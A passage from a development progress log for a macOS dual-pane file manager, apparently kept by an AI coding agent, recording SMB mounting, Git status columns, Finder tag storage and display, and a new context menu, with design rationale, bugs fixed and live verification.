couple `CompositeBackend` to the mounter) — deferred. **NEXT: live-verify against a LAN SMB share**
(mount guest + auth, browse/copy/rename/delete, disconnect-unmounts-only-ours, quit-cleanup); then the
share-picker for a bare `smb://host`, Bonjour `_smb._tcp` discovery (M6-ish), and the deferred cap tweak.

Progress (2026-07-14, M5 SMB pass 2 — VERIFIED LIVE against a LAN Windows SMB box, `192.168.1.50`,
share `Temp`, user `smbtest`): drove the built app end-to-end via computer-use. Confirmed: the Connect
dialog renders both layouts; **SMB address `smb://smbtest@host/Temp` two-way-synced into host/share/user
fields**; guest is refused by the box (auth required — mapped cleanly); an authed mount lands at
`/Volumes/Temp`, appears in the sidebar's Volumes section, and browses via `LocalBackend` (`test.txt`
visible); the named connection persisted to the **Servers** section and **survived relaunch**;
right-click **Connect / Edit… / Remove** all work — Connect re-mounts from the Keychain password (no
re-prompt), **Edit… prefills every field incl. the Keychain secret**; **New Folder (createDirectory)
and Delete Immediately (permanent removeItem) both work over SMB**; a **clean quit unmounts only our
mount**, and an externally-mounted share is **left mounted** on quit (the "unmount only ours" safety
guarantee). TWO bugs found + fixed live: (1) the `NSAlert` accessory collapsed and overlapped the
message — cause was setting `translatesAutoresizingMaskIntoConstraints = false` + sizing the container
by constraints; `NSAlert` sizes an accessory by its **frame**, so the container now keeps an explicit
frame and the grid is pinned top-left inside it; (2) re-connecting an already-mounted share hit NetFS
`EEXIST` (17, empty mountpoints) → added `existingMountPoint(for:)` (matches a mounted volume's
`statfs.f_mntfromname` `//host/share`, case-insensitive) so `mount()` **detects and reuses** an existing
mount (Finder's or ours) instead of re-mounting — which also realizes the "detect already-mounted share"
design goal. CONFIRMED the deferred cap gap is real: **Move-to-Trash (F8) fails on the Windows share**
(error 3328) since SMB carries full local caps; Delete Immediately is the working path. 481 core + 24
app tests green, swiftformat/swiftlint-strict clean. The SMB item is now `[x]`; only the optional
niceties (bare-host share-picker, Bonjour discovery, F8→permanent-delete cap-degradation on SMB mounts)
remain, all deferrable to M6-ish polish.

### M6 — Mac-native power features (M)

- [x] Git awareness: branch in path bar, status column (M/A/?/ignored) via a debounced
      `git status --porcelain` provider; optional .gitignore-aware folder sizes (the one
      optional slice, still deferred)
- [x] Finder tags: ~~column~~ **dots at the right edge of the name**, where Finder puts them (the
      word "column" was written before anyone had looked at Finder; see pass 4), edit from panel,
      filter chips in search
- [x] Terminal drawer: bottom pane following active panel's cwd; "cd sync back" via
      ~~shell integration snippet~~ `proc_pidinfo` (no snippet exists, and none should — see
      pass 7); open in iTerm/Terminal/WezTerm as alternative
- [x] Size visualization mode: toggle panel to ncdu-style bars, computed async, cached
- [x] Share sheet, "Open With" submenu, Services integration
- [x] Automation: AppleScript/Shortcuts verbs (reveal, copy, run-op); user actions —
      shell scripts receiving selection as argv/env, surfaced in palette and F-key bar
- [x] iCloud/provider sync status: ~~column~~ **a badge at the right edge of the name**, outside the
      tag dots — again where Finder puts it (measured, pass 16); ubiquity attrs where available

Exit: git repo browsing shows live status; a user-defined "convert to webp" script on
selection runs from the palette.

Progress (2026-07-15, M6 pass 1 — the Git-awareness core): the pure, tested foundation of the Git
item landed, the same core-first opener every M4/M5 slice used. Box stays `[ ]` (no provider, no
column, no path-bar branch, no app wiring yet) — this is the parse/lookup half. **Four new
`DirnexCore/Services/` files, purely additive** (no existing-API changes, so the app is untouched and
needs no rebuild). Method note: `git`'s real output was **probed live before any Swift was written**
(the pass-7 lesson — `SFTPListingParser` had to be reworked because its format was assumed, not
observed), which caught three things a from-memory parser gets wrong:
- **`GitStatus.swift`** — `GitFileStatus` (`unmodified/modified/added/deleted/renamed/untracked/
  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the colour, this picks
  the character) + `GitStatusEntry` (one porcelain record: `relativePath` + **both** of Git's axes,
  `indexStatus`/`worktreeStatus`, kept verbatim so a later tooltip can say "staged edit plus unstaged
  edits on top" without re-parsing) + `GitBranch` (name/upstream/ahead/behind/isDetached/
  hasNoCommits, for the path bar). `entry.status` collapses the two axes into the one value a column
  renders: untracked/ignored/unmerged are whole-entry verdicts and answer first; otherwise the
  **index column wins when set** (`AM` — staged new, then edited — reads "added", which is more use
  to someone browsing a folder than "modified"), else the worktree column (the common ` M`/` D`).
  Every unmerged shape (`UU`/`AU`/`UA`/`DU`/`UD`/`AA`/`DD`) is one `.conflicted`.
- **`GitStatusSnapshot.swift`** — the per-row lookup a panel does while rendering, so `status(for:)`
  is O(1) and all the work happens once at construction. **(1) Directory roll-up**: Git reports files,
  panels also show the folders holding them → every entry's ancestors are pre-merged by
  `rollupPrecedence` (conflict > modified > added > deleted > renamed > untracked > ignored), so a
  folder advertises the loudest thing inside it. **`.ignored` deliberately does NOT roll up** — a
  source folder holding one ignored `debug.log` is not itself ignored, and painting it `!` would say
  exactly that. **(2) Collapsed-directory inheritance**: Git emits `build/` and says *nothing* about
  the files inside, so a lookup that misses falls back to the nearest untracked/ignored ancestor and
  the contents still read as ignored once you navigate in. **(3)** The repo root itself is never
  painted (its roll-up would mark the `..` row of every dirty repo).
- **`GitStatusParser.swift`** — `-z` output → snapshot. **`-z` is the whole point**: without it Git
  *quotes* any path with a space or a non-ASCII byte (`"caf\303\251.txt"`) and the parser would have
  to reimplement C-string unquoting; with it every field is raw bytes. The cost is two traps, both
  found by probing: **(a) the rename pair** — `-z` emits `R  <new>` NUL `<old>` NUL, i.e. the *reverse*
  of the printed `old -> new`, so reading them in the printed order names every renamed row after the
  file that no longer exists; **(b) the branch header** is NUL-terminated like any entry, not a line.
  Four header shapes captured live and pinned: `main` · `main...origin/main [ahead 1, behind 1]` ·
  `HEAD (no branch)` · `No commits yet on main` (splitting on `...` is unambiguous — refname rules
  forbid `..` in a branch). Malformed fields are skipped, never thrown on: a snapshot missing one
  exotic row still renders a useful panel, whereas throwing blanks the whole column.
- **`GitRepository.swift`** — `repositoryRoot(for:exists:)` walks up for `.git`, **nearest first** (a
  submodule/nested repo wins, matching what `git` itself reports from there), with the filesystem
  reduced to an injected `exists` probe (`ExternalDiffTool`'s shape) so discovery is tested without a
  repository. The probe must be a **plain existence check**: `.git` is a regular *file* in a linked
  worktree or submodule, and a directory check would silently drop Git awareness exactly where people
  use worktrees. `GitCommand` pins the argv (like `SFTPProcessArguments`): **`--no-optional-locks`**
  (a plain `git status` opportunistically rewrites the index under `index.lock`; a poller doing that
  behind the user's back races their own git commands and can fail *their* rebase — this makes the
  read side-effect-free, the same reason editors pass it), `--porcelain=v1 --branch -z`, and
  **`--ignored=traditional`** (one collapsed row for `node_modules/` instead of a hundred thousand).
  **`/usr/bin/git` is deliberately NOT a candidate executable**: it is Apple's `xcrun` shim, and
  spawning it without the Command Line Tools installed pops a modal "install developer tools?" dialog
  — a background poller must never be able to do that to someone who just opened a folder. Candidates
  are Homebrew → CLT → Xcode; none installed ⇒ Git awareness stays off and the column stays blank
  (the same graceful degradation as no diff tool installed).
FINDING (documented, changed the code): the anticipated **unicode trap is a non-issue in Swift** —
macOS hands back decomposed names (`e`+U+0301) while Git, with `core.precomposeunicode` (on by
default), reports the precomposed form, so the two spell one file with different bytes (verified:
their UTF-8 differs). But Swift's `String` compares *and hashes* by **canonical equivalence**, so the
keys are interchangeable in the dictionary for free. The first draft normalized every key with
`precomposedStringWithCanonicalMapping` — which was not just redundant but a **fresh allocation on
every row lookup** in a 100k-row panel's hot path. Removed; a test pins the property instead, since
it is load-bearing and would break in any byte-keyed language.
+63 tests → **544 core tests** (was 481): the parser suite is anchored on a **golden fixture of the
exact bytes captured from git 2.50.1** against a scratch repo built to hold every shape at once.
`swift test` green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE against real repositories**
(a throwaway harness compiled against the core, driving the real `git` binary through `GitCommand`):
the scratch repo parsed every shape incl. the rename-source pairing; the four branch shapes each
confirmed on a purpose-built repo (fresh → `noCommits`, a clone → `ahead=1 behind=1`, detached →
detached); and **Dirnex's own repo** reported branch `Dev` / upstream `origin/Dev` (matching
`git rev-parse`) with the roll-up painting the top-level `DirnexCore` row `?` from files nested four
levels deep, and `.claude`/`build` collapsed to single ignored rows. The NFD-vs-NFC match was proven
live too — the on-disk decomposed name resolved against Git's precomposed key through the real
filesystem. **NEXT (M6 pass 2, the app layer):** a `GitStatusProvider` (`Process`-driven, **debounced**,
off-main, cached per repo root, refreshed on FSEvents + directory change — mirroring
`SpotlightSearchRunner`/`ArchiveMounter`), the **status column** in the panel (per-tab, like the other
columns) and the **branch in the path bar**; then the optional `.gitignore`-aware folder sizes.

Progress (2026-07-15, M6 pass 2 — the app layer; **the Git box closes `[x]`**, only the item's own
"optional" `.gitignore`-aware folder sizes deferred). Three new app files plus one split, and no core
change at all (pass 1's 544 tests stand untouched):
- **`GitStatusProvider.swift`** — spawns `git` off-main through pass 1's `GitCommand`, parses with
  `GitStatusParser`, caches one snapshot per **repository root** (LRU, 8). Shared, not per-pane,
  because the unit of caching is the repository: two panes in one working tree must get one answer
  from one run. **Rate limiting is the whole design, not a nicety** — in a repository the FSEvents
  never stop (a build writes thousands of files, a checkout rewrites the tree), so a request is
  either coalesced into a 300 ms trailing window or, when the snapshot has already been stale for
  2 s, run immediately: a pure trailing debounce starves under a long build's continuous churn and
  would freeze the column for its duration. Runs are serialized per root (a request arriving mid-run
  is replayed once, never spawned alongside). **Pass 1's `--no-optional-locks` turns out to be what
  makes any of this terminate**: without it our own `git status` would rewrite `.git/index`, FSEvents
  would report that as a change, and the pane would ask for another refresh — a spawn loop fed by
  nothing but our own reading.
- **BUG, caught reviewing before the live run:** the "a first look runs immediately" test asked *do
  we have a snapshot*, but a repository `git` refuses to read (dubious ownership, a corrupt index)
  caches none — so every event would count as a first look and spawn `git` again, precisely the storm
  the rate limiting exists to prevent. It now asks *have we ever run this* (`lastRun`), and `forget()`
  deliberately keeps the run stamp when it drops the snapshot; only LRU eviction clears it, which
  correctly makes an aged-out repository a first look again.
- **`PanelViewController+Git.swift`** — per-*tab* root + snapshot (so a tab switch restores the Git
  view along with everything else), per-*pane* watcher. **The pane's existing directory watcher is
  blind to exactly the changes Git status turns on**: `git add` in a terminal, a branch switch, an
  edit in a sibling folder all change what these rows should say while touching nothing under the
  folder on screen — the index and `HEAD` live at the root. So the Git side watches the **root**
  instead, and every pane in that repository coalesces onto the provider's one debounced run. The
  watched root is tracked on the pane, not read back from the tab: a tab switch can leave the tab's
  root unchanged while the pane's watcher was torn down for the other tab (a nil-watcher hole the
  first draft had).
- **The gutter is a *contextual* column** (`Column.isContextual`): a permanently blank "Git" column in
  every folder that isn't a repository — most of them — is clutter, so it exists only inside one,
  sits right after Name, fixed at 20 pt, unsortable (`sortKey` became optional), header "" plus a
  `headerToolTip`. It is **paid for out of the Name column**, never added on top of the table —
  caught by the user on review of the first cut, which appended it and so shoved Size and Date
  sideways on every step into a repository, moving columns they had placed deliberately for a reason
  that has nothing to do with them. Name is the right column to charge because it is already the one
  that absorbs slack (`firstColumnOnlyAutoresizingStyle`); a filename with less room is a truncation,
  not a rearranged pane. (The alternative — drawing the status inside the name cell, VS Code-style —
  was rejected: text colour there is already taken by the mark's bold red and the hidden-file dim,
  and inline rename (F2) replaces that cell's text field with an editable box a badge would have to
  dodge. It would reserve the same 20 pt anyway.) **GOTCHA, and the reason the first fix still
  drifted ~17 pt: `intercellSpacing.width` is 17 pt at this table's `.plain` style, not the 2–3 pt
  the name suggests.** A column costs `width + intercellSpacing`, so the carve must be 37, not 20 —
  established by probing a throwaway `NSTableView` configured exactly like the pane (the same
  measure-don't-assume move as pass 1's `git` probing; the frame returned to its baseline 541.5 only
  once the spacing was included) and read live from the table rather than hardcoded. That is only
  safe because **it never enters a stored layout**: `defaultColumnLayout`
  excludes it and `currentColumnLayout` filters it out, or else every step into a repository would
  look like the user rearranging their columns — and be persisted as such. That same capture also
  **adds the footprint back onto Name**, since while the gutter is installed Name is physically that
  much narrower: storing the carved width would ratchet Name 37 pt smaller on every trip through a
  repository. `applyColumnLayout` lifts the gutter out before the reorder pass and re-installs after:
  that pass moves each stored column to its target index in turn, which drags an unlisted column to
  the far end one move at a time.
  `FileCellView.accentColor` carries the status colour — it outranks the mark's red (a marked
  modified file still shows an orange `M`) and yields to the cursor's emphasized background.
- **BUG the user caught, and the reason the pane has `renderRefresh` at all:** the snapshot-arrived
  path hand-rolled `tableView.reloadData()`, which drops the table's selection — so **crossing a
  repository boundary silently deselected the row**, `..` included. It only ever showed at a
  crossing, because that is the only time the snapshot *changes* (nil ⇄ snapshot); walking around
  inside one repository re-uses it and never reloads. The fix is to stop hand-rolling: an arriving
  snapshot is a live background change like FSEvents or a directory-size total, so it goes through
  `renderRefresh()`, which re-anchors the cursor from the model (the `..` row lives only in
  `cursorOnParentRow`, which the model cannot restore for you) and pointedly does *not* scroll.
  Sobering detail: this was **visible in the pass's own verification screenshots** — every repo pane
  had no highlighted row while the home folder did — and went unnoticed until the user pointed at it.
  A screenshot only verifies what you actually look at.
- **`GitBranchChipView.swift`** — glyph + name + `↑2 ↓1` only when drifted, with a tooltip spelling it
  out. Deliberately **inert**: a click here would be an offer to switch branches, and the only thing
  worse than no Git operations in a file manager is Git operations where a misclick rewrites the
  worktree. It rides *inside* the crumb stack (after the greedy spacer) rather than pinned to the
  bar's edge — `NSStackView` collapses a hidden arranged view, whereas a hidden pinned one keeps
  reserving its width: a branch-shaped hole in the path bar of every folder that isn't a repo.
- GOTCHAS (both recurring, both already on the list): `PathBarView` sat at 496 of the 500-line
  `file_length` limit, so the chip forced splitting the location rendering into
  `PathBarView+Location.swift` — which immediately hit **"Swift `private` doesn't cross files"**
  (`installVirtualLabel` touches the private `crumbStack`), fixed by keeping it beside `installCrumbs`
  and widening only `rebuildCrumbs` to internal. Also swiftlint's `optional_data_string_conversion`
  rejects `String(decoding:as:)` — disabled in place with the reason: the failable initializer it
  prefers answers `nil` for the *whole* output on one non-UTF-8 filename, blanking the column for
  every other row, where lossy decoding costs only that row's key.
+9 app tests → **33** (the hermetic surface: how a branch reads, and the contextual-column invariant;
the subprocess/cache half is non-hermetic and verified live, as with `SMBMounter`). 544 core + 33 app
green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE** against a purpose-built repo holding
every shape at once with a real upstream: the root painted `build` `!` · `deep` `M` (rolled up from a
file **four levels down**) · `scratchdir` `?` (collapsed untracked dir) · `src` `M` (precedence:
modified beats the deleted/renamed/untracked also inside it) · `debug.log` `!`, with `..` blank and
the chip reading `main ↑1 ↓1`; inside `src/`: `added.txt` `A`, `edited.txt` `M`, **`renamed.txt` `R`**
— which proves pass 1's reversed `-z` rename pair end-to-end, since the printed order would have
painted the name that no longer exists — clean files blank, `untracked.txt` `?`. Then **live, with no
navigation**: `git add src/untracked.txt` (an index-only change, nothing under the folder on screen)
flipped `?`→`A`, which is the root watcher earning its existence, and `git checkout -b
feature/live-check` retitled the chip and dropped the arrows. Crossing to **Dirnex's own repo**
re-derived root/snapshot/branch/watcher (`Dev`; `Dirnex` `M`, `DirnexTests` `?`, `DirnexCore` blank —
matching exactly what this pass had touched); leaving for `~/Downloads` took the gutter and chip away;
the right pane never grew a column while the left had one; and the persisted layout after all of that
was still `name`/`size`/`date` alone. Incidental confirmation of a pass-1 decision: this Mac has **no
Homebrew git**, so the CLT candidate is what resolved — and `/usr/bin/git`, excluded as the `xcrun`
shim, is exactly what a naive provider would have spawned. Re-verified after the Name-carve fix: the
Size and Date headers sit at **identical** positions inside and outside a repository (only Name's
sort indicator moves), and four crossings in a row left the stored width at exactly 250.5. Re-verified
after the cursor fix, all four crossings: Cmd+L into a repo keeps the cursor on the first row, Enter
on `..` out of one lands on the folder you came from, and a snapshot landing *on top of* a cursor
parked on `..` (forced by creating an untracked file from a terminal) leaves `..` selected while the
new `?` row appears beneath it.
**NEXT (M6 pass 3):** Finder tags (column, edit from panel, filter chips in search), then the
terminal drawer / size-visualization mode.

Progress (2026-07-15, M6 pass 3 — the Finder-tags core): the pure, tested foundation of the tags
item, the same core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no column, no editor, no
chip UI — this is the value/parse/read-write half). **Two new `DirnexCore/Services/` files plus one
additive field on `SpotlightQuery`.** Method note, and it paid for itself repeatedly: **the stored
format was probed against real tagged files before any Swift was written** (the pass-1 `git` lesson,
and the pass-7 `SFTPListingParser` rework that came of *assuming* a format). Every claim below was
observed, and the first draft of nearly all of them would have been wrong:
- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + colour, parse/
  serialize) + `FinderTagPayload` (the attribute's binary-plist array). The format is
  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolourIndex` strings**.
  Traps found by probing: **(a) the colour indices are not Finder's display order** — `FavoriteTagNames`
  reads Red, Orange, Yellow, Green, Blue, Purple, Grey, which looks like the enumeration and is not
  it; the real mapping (0 none · 1 Grey · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
  was established by letting the system assign each colour itself from a bare name. `Grey` resolves,
  `Gray` does not. **(b) A third field exists in the wild**: passing an already-suffixed `Red\n6` to
  `URLResourceValues.tagNames` makes the system treat the *whole string* as the name and append its
  own lookup, storing `Red\n6\n0` — my own first probe wrote corrupt tags this way and they looked
  right. The system reads such rows back as plain `Red`, so fields past the colour are ignored here
  too. **(c) The colour field is optional** (a bare `Plainname` round-trips), and the system always
  *emits* it, `\n0` included — so we emit what it emits. Identity is the **name, case-insensitively**,
  which is the system's own rule (writing `red` stores `red` but resolves to Red's 6), and matches the
  `SavedSearch`/`ServerConnection` name-as-identity precedent. Malformed rows are skipped and a
  nonsense colour degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
  bad row must not blank the cell. Duplicates collapse (the system does **not** dedupe on write).
- **`FinderTagStorage.swift`** — the local xattr read/write, in core beside `ByteComparator` per §2.
  **Why it writes the attribute by hand rather than calling `URLResourceValues.tagNames`, the
  documented API — two independent reasons, either sufficient: (1) its setter is macOS 26+ and
  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a colour** — it
  takes bare names and looks each up in a global database that a write of ours never registers into,
  so expressing an edit through it strips the colour off every custom tag on the file (probed: after
  storing a purple `Zebra`, `tagNames = ["Zebra"]` writes `Zebra\n0`). A data-loss bug wearing the
  documented API's clothes. The getter is available on 14 but drops colours, so it is no use for a
  column either. The one thing the API does that we then must do ourselves is **keep the legacy
  `com.apple.FinderInfo` label byte in sync** — probed: `tagNames = ["Red"]` leaves Spotlight
  reporting `kMDItemFSLabel = 6` where a raw write leaves 0, and the selection rule is **the last
  *coloured* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
  colourless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
  codes belonging to whoever wrote them.
- **`SpotlightQuery.tags`** — the chip's pure half; the file's own header comment had anticipated it
  since M4. One `kMDItemUserTags == "Name"c` clause **per tag, ANDed** (kinds OR because a second kind
  broadens; a second tag narrows — the overlap is what the user is asking for). Only names, because
  only names are indexed. **BUG caught while adding it:** `SpotlightQuery` is `Codable` and persisted,
  so a synthesized decoder would throw on the M4-era saved searches that have no `tags` key — which
  would not fail loudly, it would **empty the user's Searches sidebar on upgrade**. Hand-rolled
  `init(from:)` with `decodeIfPresent`, pinned by a test against a literal legacy payload.
MEASURED, and it decides the app pass's architecture: **one `getxattr` costs ~10 µs, tagged or not →
~1 s across a 100k-row directory**, against M1's 150 ms budget for opening one. So tags must **not**
be folded into `LocalBackend.listDirectory`; the column gets the `GitStatusProvider` treatment — off
main, cached, filled asynchronously. (Per *selection* it is nothing, so editing reads inline.)
+44 tests → **588 core tests** (was 544), the payload suite anchored on a **golden fixture of the
exact bytes macOS wrote** for a real tagged file. `swift test` green, swiftformat + swiftlint-strict
clean; app target untouched (new files + one additive field, so no rebuild needed).
**VERIFIED LIVE** — a harness compiled against the real core wrote tags into a real folder, then
**Finder itself** was the judge: the stock `Red` painted a red dot, a custom **purple `Zebra` + `Blue`
rendered as Finder's two-tone split dot**, a colourless `Work` correctly drew **no** dot and left no
FinderInfo record, an incremental add+remove (case-insensitive) preserved the custom purple, Get Info
listed the names, `kMDItemFSLabel` read **6** where a naive raw write leaves 0, and **Spotlight
indexed our tags** — the exact predicate `SpotlightQuery` builds, run verbatim through `mdfind`,
found the file (the search chip, end-to-end). All artifacts removed after.
**FINDING that shapes pass 4, and the reason to look rather than assume:** mid-verification Finder
**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a colour. It is not
reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honoured, and rendered orange
in both the dot and the Get Info chip. The consistent explanation: **a colour belongs to the *name*,
system-wide, not to the file** — the system's name → colour database is authoritative, and Finder
reconciles a file's stored copy against it, so `Zebra`, which my own earlier probes had registered as
colourless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a colour
when *introducing* a tag, but must not present per-file colour as the user's to own — re-colouring
one file's `Work` is not a change macOS keeps. (Exact trigger not pinned down; it is Finder's
business, and the engineering conclusion holds either way.)
**NEXT (M6 pass 4, the app layer):** a `FinderTagProvider` mirroring `GitStatusProvider` (off-main,
cached, FSEvents-refreshed — the ~10 µs/row measurement is why), the **tag column** (dots, and
contextual-vs-always-on is the open question: unlike Git, tags aren't scoped to a repo, so a
permanently-blank column for people who don't tag would be the Git gutter's mistake in reverse),
**editing from the panel** (a tag menu over the selection, offering the seven stock tags + the names
already in use), and the **filter chips** in the search sheet.

Progress (2026-07-15, M6 pass 4 — the Finder-tags app layer): **the box is closed, VERIFIED LIVE.**
Four new app files, one generalized out of the Git pass, and no core change beyond two catalog
commands — the pass-3 core was already the right shape.

**The open question, answered by the user: a View toggle (`Show Tags`), defaulting on** — not the Git
gutter's contextual rule. The rule was tempting (it is right there, tested, one line to reuse) but its
*justification does not transfer*, which is the whole finding: a repository is a coarse, stable
property of a whole subtree, so the gutter appears once on the way in and stays; tagged files are
**scattered**, so the identical rule would install and remove the column — and re-truncate every
filename, since a gutter is paid for out of Name — on nearly every step between sibling folders. A
precedent is an argument, not a licence. The preference is still ANDed with "could these rows carry
tags at all" (local files, and search hits, which are local files in a virtual pane): inside an
archive or on SFTP the column could only ever be blank, which is what the preference exists to avoid.
The checkmark tracks the *preference*, never that derived state — unchecking the box inside a zip
would blame the user's setting for the filesystem's limits.
- **`PanelViewController+ContextualColumns.swift`** — the Git pass's install/footprint/carve
  machinery, lifted out and generalized, because **a second gutter would have silently broken the
  first**: `currentColumnLayout` reclaimed `gitColumnFootprint` specifically, so with two installed it
  would refund half of what it charged and Name would ratchet narrower on every capture — the exact
  bug the reclaim exists to prevent, just slower. Now sums over all installed gutters. Insertion keeps
  `Column.allCases` order among them (Name │ git │ tags │ Size │ Date) whichever arrives first, so
  installing one never reshuffles another. `Column` gained `headerToolTip` (both gutters are too
  narrow to title).
- **`FinderTagProvider.swift`** — `GitStatusProvider`'s shape (off-main, LRU 8, 300 ms debounce or
  run-now past 2 s stale, serialized per key, published by notification) for the reason the core
  *measured*: ~10 µs per `getxattr` is ~1 s across a 100k-row directory. **What differs and why:** its
  unit of caching is the *repository* because one `git status` answers for a whole tree; there is no
  such command for tags, so the unit is the **directory** and the caller passes the paths. The pane
  passes its **whole listing, not its visible rows** — two panes on one folder can have different
  hidden/filter settings, and a scan of the narrower one would evict rows the other still shows,
  leaving tagged files looking untagged. `knownTagNames` accumulates as you browse (there is no API
  for "the user's tags"; the system's list is Finder's own synced plist, not a contract) and feeds
  both the editor menu and the search completion — verified live: `Urgent`, met in one tab, was
  offered in another. **`FinderTagSnapshot.==` is hand-rolled and must be**: `FinderTag`'s own `==`
  compares names case-insensitively and **ignores colour** — correct for identity, wrong for "did the
  pixels change" — so the synthesized version would answer "equal" when Finder recoloured a tag (which
  pass 3 documented it doing *by itself*) and the column would keep painting the old dot.
- **`PanelViewController+Tags.swift`** — per-tab snapshot, install, row lookup. **No watcher of its
  own, unlike Git**: the Git side had to watch the *repository root* because `git add` in a terminal
  changes what rows say while touching nothing under the visible folder; a tag has no elsewhere — it
  is an attribute **on the file** — so the pane's existing directory watcher already fires for it.
  Verified live (a new file appeared and rescanned with the rest).
- **`TagCellView.swift`** — custom-drawn dots; the content *is* the colour, so it borrows neither
  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgement calls: a **colourless
  tag draws a hollow ring** where Finder draws nothing — Finder can afford that because its dots sit
  beside the name, so absence reads as "no colour", whereas in a column of its own it would read
  "untagged", a lie about a file the user did tag; and on the cursor's emphasized row every dot is
  **ringed in the selection's text colour**, or a blue tag vanishes into blue.
- **`PanelViewController+TagEditing.swift`** — ⌃T (free; ⌘T is New Tab, and ⌃D/⌃Q are where this app's
  popups already live) drops a menu over the cursor row: stock seven + names in use, `.on`/`.mixed`
  per how many targets carry each, toggle across the selection, New Tag…, Remove All Tags. Targets are
  filtered **per entry** (`.local`), not per pane — which is what lets tagging work from a search
  results tab, and makes a mixed selection tag what it can. **The menu offers a colour only when
  *introducing* a name**, per pass 3's finding that colour belongs to the name system-wide: offering
  per-file colour would be offering an edit macOS silently reverts.
- **Search chips** — an `NSTokenField` (a tag *is* a token; it rounds each name into a deletable chip
  and completes against `knownTagNames`). Read via **`stringValue`, not `objectValue`**: the latter
  holds only *tokenized* chips, so a tag typed without a trailing comma would not merely be dropped
  from the search — with a tag as the only term, `isEmpty` would leave **Find disabled** and the
  search unrunnable. Flagged as a risk while writing, then confirmed live both ways.

**BUG FOUND LIVE, and it is the Git pass's own lesson repeating:** ⌘A-then-⌃T dropped the menu at the
*bottom* of the pane, clipped and scrolling. I had anchored on `tableView.selectedRow` — but marks are
independent of the cursor here, so marking everything leaves the table with **no selected row**,
`selectedRow` answers -1, and the `visibleRect` fallback resolves to the pane's lowest edge (the table
is flipped, so `maxY` is the bottom). Fixed to anchor on the **model's** cursor, which always exists
and is the only source that knows about the `..` row. Same root as pass 2's `reloadData` bug: *the
table is a renderer; the model is the truth.*

**VERIFIED LIVE** end-to-end, with macOS itself as the independent judge on both ends — the fixtures
were tagged by **Apple's own writer** (`URLResourceValues.tagNames`, available on this macOS 26 box
though not on Dirnex's 14 floor) and our writes were read back through **Apple's own getter**, which
saw exactly what we wrote. Confirmed: every dot case (stock, multi, 3-dot cap from five, hollow ring
for a colourless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*coloured*-tag-wins rule
pass 3 documented, maintained by our hand-written label; a purple `Milestone` across a 6-file marked
set **preserving the existing `Quokka\n0` verbatim** (the exact data loss `tagNames` would have
caused, which is why the core writes by hand); the mixed `−` state; completion offering a custom name
learned by browsing; the chip narrowing `mdfind` to the one file carrying `Urgent`; **dots in the
results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T greyed out; the
toggle taking both panes live; and **both gutters coexisting in the Dirnex repo itself** (Name │ `M`/`!`
│ dots │ Size │ Date). The layout invariant was checked in the persisted store, not by eye: after
repeated toggles and tab switches Name stayed **exactly 279.5** and no `tags` entry ever entered a
stored layout. 588 core + 33 app tests green, swiftformat + swiftlint-strict clean. Test artifacts
removed. Gotcha, recurring: the 4-line hookup tipped `PanelViewController.swift` to **501/500 lines**
(`file_length`) — paid for by tightening my own comment rather than widening a `private` across a
file split, which is the trap that costs more than it saves.

Progress (2026-07-15, M6 pass 5 — tags in the name cell, and the missing right-click menu): user
review of pass 4 killed the tag *column* outright and asked for Finder's actual arrangement, plus the
context menu the app had never had. Both done, VERIFIED LIVE.

**The column is gone; the dots ride at the right edge of the name.** This is the better design and the
user was right to ask for it, but note what it retires: the whole preference question pass 4 agonized
over (contextual vs always-on vs a toggle) was an artefact of the dots *being a column* — a column
must be present or absent for the whole pane, so it had to be blank for non-taggers or jitter. Inside
the name cell the question dissolves: an untagged row draws nothing and gives its name the full width,
so tags cost exactly the rows that have them. `showTags` survives as a plain on/off (the dots are
still someone's clutter to refuse) and `areTagsVisible` still ANDs in "could these rows carry tags",
but the elaborate justification is gone with the column. **Pass 4's generalization of the contextual-
column machinery went with it** — it existed only to host a second gutter, so `+ContextualColumns` was
deleted and `+Git`/`+Columns` restored verbatim from 42e88f2. A generalization with one client is just
a longer way to write the client. **The Git gutter keeps its column and should**: it is *text*,
competing for the name field's colour with the mark's red and the hidden-file dim, and F2 swaps that
field for an editor — none of which applies to a view that draws its own dots.
- **`TagDotsView`** (was `TagCellView`) — an `NSView` inside `FileCellView`, right-aligned, sized by
  `intrinsicContentSize` so Auto Layout hands the name whatever the dots don't need. The name's
  compression resistance is lowered so a long filename truncates *before* the cluster instead of
  running under it. F2 clears `tags` for the row being renamed (a *hidden* view still holds its
  width, so hiding is not enough) — nothing to restore, since the next render sets them like every
  other recycled-cell property.
- **The layout is Finder's, measured not guessed** — a file tagged `Red, Green, Blue, Yellow` was
  written by the system, opened in Finder and zoomed into, and both findings contradict the obvious
  draft: **the dots run in reverse** (the *last* tag is leftmost and whole, each earlier one peeking
  out behind it to the right — the same last-wins precedence the core found in the legacy label byte),
  and they **overlap by ~two thirds**, so five tags stay a compact cluster. The thin gap between dots
  is punched with `.destinationOut` on the view's **own layer** (hence `wantsLayer`): it erases only
  our dots, so the row's real background shows through — a stroke in a fixed colour cannot work,
  because the background is alternating-or-blue and not ours to know.
- **The context menu** (`PanelViewController+ContextMenu`) — the app had none at all. Built from
  `CommandCatalog` via `MainMenuBuilder.commandItem` (made internal), so a right-click item and its
  menu-bar twin cannot drift; nil targets mean `validateMenuItem` greys them out for free (Paste with
  an empty clipboard, everything mutating inside an archive). Two menus: one over an entry, one over
  the empty space (folder-scoped: New Folder, Paste, Add to Hotlist, Synchronize). **Tags is a
